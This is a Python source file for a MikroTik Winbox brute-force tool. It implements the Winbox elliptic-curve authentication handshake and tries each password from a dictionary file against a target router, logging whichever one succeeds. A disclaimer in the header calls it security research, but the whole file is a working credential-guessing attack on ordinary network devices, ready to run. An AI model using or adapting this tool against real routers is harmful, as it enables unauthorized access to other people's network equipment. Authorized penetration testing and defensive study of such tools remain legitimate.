#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MikroTik Winbox bruteforce
Copyright (C) 2025 localhost (Apache 2.0)

Description:
  Security research tool for authorized winbox protocol testing.

Disclaimer:
  This tool is for LEGAL SECURITY RESEARCH ONLY.
  See README.md and LICENSE for full terms.
"""

import elliptic_curves
import encryption
import socket
import secrets
import argparse
import datetime
import os
import sys
import logging
from typing import Optional, List

class WinboxAuthenticator:
    def __init__(self, host: str, port: int = 8291):
        self.host = host
        self.port = port
        self.socket = None
        self.reset_session()

    def reset_session(self):
        self.stage = -1
        self.w = elliptic_curves.WCurve()
        self.s_a = b''
        self.x_w_a = b''
        self.x_w_a_parity = -1
        self.x_w_b = b''
        self.x_w_b_parity = -1
        self.j = b''
        self.z = b''
        self.secret = b''
        self.client_cc = b''
        self.server_cc = b''
        self.i = b''
        self.msg = b''
        self.resp = b''

    def close(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            finally:
                self.socket = None

    def gen_shared_secret(self, salt: bytes, username: str, password: str):
        self.i = self.w.gen_password_validator_priv(username, password, salt)
        x_gamma, gamma_parity = self.w.gen_public_key(self.i)
        v = self.w.redp1(x_gamma, 1)
        w_b = self.w.lift_x(int.from_bytes(self.x_w_b, "big"), self.x_w_b_parity)
        w_b += v
        self.j = encryption.get_sha2_digest(self.x_w_a + self.x_w_b)
        pt = int.from_bytes(self.i, "big") * int.from_bytes(self.j, "big")
        pt += int.from_bytes(self.s_a, "big")
        pt = self.w.finite_field_value(pt)
        pt = pt * w_b
        self.z, _ = self.w.to_montgomery(pt)
        self.secret = encryption.get_sha2_digest(self.z)

    def auth(self, username: str, password: str) -> bool:
        try:
            while True:
                if self.stage == -1:
                    self._connect_to_server()
                elif self.stage == 0:
                    self._prepare_handshake(username)
                elif self.stage == 1:
                    if not self._process_server_response(username, password):
                        return False
                elif self.stage == 2:
                    if self._verify_server_response():
                        return True
                    return False

                if self.msg:
                    self.socket.send(self.msg)
                    self.msg = b''

        except (socket.timeout, socket.error, Exception) as e:
            raise Exception(f"Stage {self.stage} error: {str(e)}")
        finally:
            self.close()

    def _connect_to_server(self):
        self.close()
        self.reset_session()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        self.socket.connect((self.host, self.port))
        self.stage = 0

    def _prepare_handshake(self, username: str):
        self.s_a = secrets.token_bytes(32)
        self.x_w_a, self.x_w_a_parity = self.w.gen_public_key(self.s_a)
        if not self.w.check(self.w.lift_x(int.from_bytes(self.x_w_a, "big"), self.x_w_a_parity)):
            raise Exception("Invalid public key generated")
        
        self.msg = username.encode('utf-8') + b'\x00' + self.x_w_a + int(self.x_w_a_parity).to_bytes(1, "big")
        self.msg = len(self.msg).to_bytes(1, "big") + b'\x06' + self.msg
        self.stage = 1

    def _process_server_response(self, username: str, password: str) -> bool:
        self.resp = self.socket.recv(1024)
        resp_len = self.resp[0]
        self.resp = self.resp[2:]
        
        if len(self.resp) != int(resp_len):
            return False
            
        self.x_w_b = self.resp[:32]
        self.x_w_b_parity = self.resp[32]
        salt = self.resp[33:]
        
        if len(salt) != 0x10:
            return False
            
        self.gen_shared_secret(salt, username, password)
        self.j = encryption.get_sha2_digest(self.x_w_a + self.x_w_b)
        self.client_cc = encryption.get_sha2_digest(self.j + self.z)
        self.msg = len(self.client_cc).to_bytes(1, "big") + b'\x06' + self.client_cc
        self.stage = 2
        return True

    def _verify_server_response(self) -> bool:
        self.resp = self.socket.recv(1024)
        self.server_cc = encryption.get_sha2_digest(self.j + self.client_cc + self.z)
        if self.resp[2:] != self.server_cc:
            return False
        self.stage = 3
        return True

def configure_logging(output_file: Optional[str] = None) -> logging.Logger:
    logger = logging.getLogger('WinboxAuth')
    logger.setLevel(logging.INFO)
    
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    if output_file:
        os.makedirs(os.path.dirname(output_file) or '.', exist_ok=True)
        file_handler = logging.FileHandler(output_file)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
    
    return logger

def load_password_file(file_path: str) -> List[str]:
    """Загрузка паролей из файла с обработкой ошибок"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        raise Exception(f"Password file not found: {file_path}")
    except Exception as e:
        raise Exception(f"Error reading password file: {str(e)}")

def brute_force_auth(args, logger: logging.Logger) -> Optional[str]:
    """Последовательный перебор паролей с обработкой ошибок"""
    try:
        passwords = load_password_file(args.dict)
        total_passwords = len(passwords)
        logger.info(f"Starting brute force against {args.ip}:{args.port}")
        logger.info(f"Loaded {total_passwords} passwords from dictionary")
        
        for attempt, password in enumerate(passwords, 1):
            try:
                logger.debug(f"Trying password #{attempt}: {password}")
                
                authenticator = WinboxAuthenticator(args.ip, args.port)
                if authenticator.auth(args.username, password):
                    logger.info(f"SUCCESS! Password found after {attempt} attempts: '{password}'")
                    return password
                
                # Вывод прогресса каждые 10% или каждые 10 попыток
                if attempt % max(10, total_passwords//10) == 0:
                    progress = attempt/total_passwords*100
                    logger.info(f"Progress: {attempt}/{total_passwords} ({progress:.1f}%)")
                    
            except Exception as e:
                logger.warning(f"Attempt {attempt} failed with password '{password}': {str(e)}")
                continue
                
        logger.info("Brute force completed - password not found")
        return None
        
    except KeyboardInterrupt:
        logger.info("Brute force interrupted by user")
        return None
    except Exception as e:
        logger.error(f"Brute force failed: {str(e)}")
        return None

def single_auth(args, logger: logging.Logger) -> str:
    """Проверка одного пароля"""
    try:
        authenticator = WinboxAuthenticator(args.ip, args.port)
        if authenticator.auth(args.username, args.password):
            return "OK"
        return "False"
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    parser = argparse.ArgumentParser(description="MikroTik Winbox Authentication Tool")
    parser.add_argument("--ip", required=True, help="Router IP address")
    parser.add_argument("--port", type=int, default=8291, help="Winbox port (default: 8291)")
    parser.add_argument("--username", required=True, help="Authentication username")
    parser.add_argument("--password", help="Single password to check (use either this or --dict)")
    parser.add_argument("--dict", help="Password dictionary file for brute force")
    parser.add_argument("--output", help="Log file path (optional)")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()

    if not args.password and not args.dict:
        parser.error("You must specify either --password or --dict")

    logger = configure_logging(args.output)
    if args.debug:
        logger.setLevel(logging.DEBUG)

    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if args.dict:
            # Режим перебора паролей
            found_password = brute_force_auth(args, logger)
            result = f"Found: {found_password}" if found_password else "Not found"
        else:
            # Режим проверки одного пароля
            result = single_auth(args, logger)
        
        # Формирование итоговой строки
        result_line = f"{timestamp} - {result} - {args.ip}:{args.port} - {args.username}"
        if args.dict:
            result_line += " - brute_force_mode"
        else:
            result_line += f" - password_tested"
        
        print(result_line)
        logger.info("Final result: " + result_line)

    except Exception as e:
        logger.error(f"Critical error: {str(e)}")
        print(f"Error: {str(e)}")
    finally:
        logging.shutdown()

if __name__ == "__main__":
    main()
